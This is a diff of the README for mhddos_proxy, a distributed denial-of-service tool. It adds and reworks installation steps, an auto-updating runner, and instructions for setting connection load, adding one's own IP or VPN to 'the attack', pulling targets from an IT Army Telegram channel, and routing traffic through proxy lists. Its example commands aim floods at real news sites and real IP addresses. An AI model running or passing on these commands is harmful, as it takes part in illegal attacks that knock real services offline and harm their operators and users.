@@ -25,7 +25,7 @@ Update versions for | Mac | Linux | Android | Docker (UA only so far): https://t
 
 ### 1. 💽 Installation
 
-#### Python (If it doesn't work, try `python` or `python3.10` instead of `python3`)
+#### Python (if it doesn't work, try `python` or `python3.10` instead of `python3`)
 
     git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
     cd mhddos_proxy
@@ -39,7 +39,11 @@ Install and start Docker: https://docs.docker.com/desktop/#download-and-install
 
 ### 2. 🕹 Running (different options for targets are given)
 
-#### Python (If it doesn't work, try `python` or `python3.10` instead of `python3`)
+#### Python with automatic updates (if it doesn't work, try `python` or `python3.10` instead of `python3`)
+
+    ./runner.sh python3 https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477
+
+#### Python (manual updates required) (if it doesn't work, try `python` or `python3.10` instead of `python3`)
 
     python3 runner.py https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477
 
@@ -49,23 +53,12 @@ Install and start Docker: https://docs.docker.com/desktop/#download-and-install
 
 ### 3. 🛠 Options (check out more in the [CLI](#cli) section)
 
-**All options can be combined**, you can specify them either before and after the list of targets
+All options can be combined, you can specify them either before and after the list of targets
 
-Change the workload: `-t XXXX`; the maximum number of simultaneously open connections; the default is 7500 (or 1500 if the machine has only one CPU).
-
-    python3 runner.py -t 7500 https://ria.ru https://tass.ru
-
-To monitor information about the progress, add the `--debug` flag for the text, `--table` for the table-style display
-
-    python3 runner.py --debug https://ria.ru https://tass.ru
-
-Consider adding your IP/VPN to the attack (especially when running on dedicated server)
-
-    python3 runner.py https://ria.ru https://tass.ru --vpn
-
-To use targets provided by https://t.me/itarmyofukraine2022 add the `--itarmy` option  
-
-    python3 runner.py --itarmy --debug
+- Change the workload: `-t XXXX`; the maximum number of simultaneously open connections; the default is 7500 (or 1500 if the machine has only one CPU).
+- To monitor information about the progress, add the `--debug` flag for the text, `--table` for the table-style display
+- Consider adding your IP/VPN to the attack (especially when running on dedicated server), add flag `--vpn`
+- To use targets provided by https://t.me/itarmyofukraine2022, add the `--itarmy` flag  
 
 ### 4. 📌 Help with finding new proxies for mhddos_proxy
 The script itself and installation instructions are here: https://github.com/porthole-ascend-cinnamon/proxy_finder
@@ -106,14 +99,13 @@ The script itself and installation instructions are here: https://github.com/por
 
 ### 7. Custom proxies
 
-#### File format:
+#### File format (any of the following):
 
     IP:PORT
     IP:PORT:username:password
     username:password@IP:PORT
     protocol://IP:PORT
     protocol://IP:PORT:username:password
-    protocol://username:password@IP:PORT
 
 where `protocol` can be one of 3 options: `http`|`socks4`|`socks5`. 
 If `protocol` is not specified, default value `http` is used.
@@ -128,8 +120,7 @@ and for the private `socks4` proxy format can be one of the following:
 
 **URL of the remote file for Python and Docker**
 
-    python3 runner.py https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt
-    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt
+    --proxies https://pastebin.com/raw/UkFWzLOt
 
 where https://pastebin.com/raw/UkFWzLOt is your web page with a list of proxies (each proxy should be on a new line)  
 
@@ -137,6 +128,6 @@ where https://pastebin.com/raw/UkFWzLOt is your web page with a list of proxies 
   
 Put the file in the folder with `runner.py` and add the following option to the command (replace `proxies.txt` with the name of your file)
 
-    python3 runner.py --proxies proxies.txt https://ria.ru
+    --proxies proxies.txt https://ria.ru
 
 where `proxies.txt` is your proxy list file (each proxy should be on a new line)
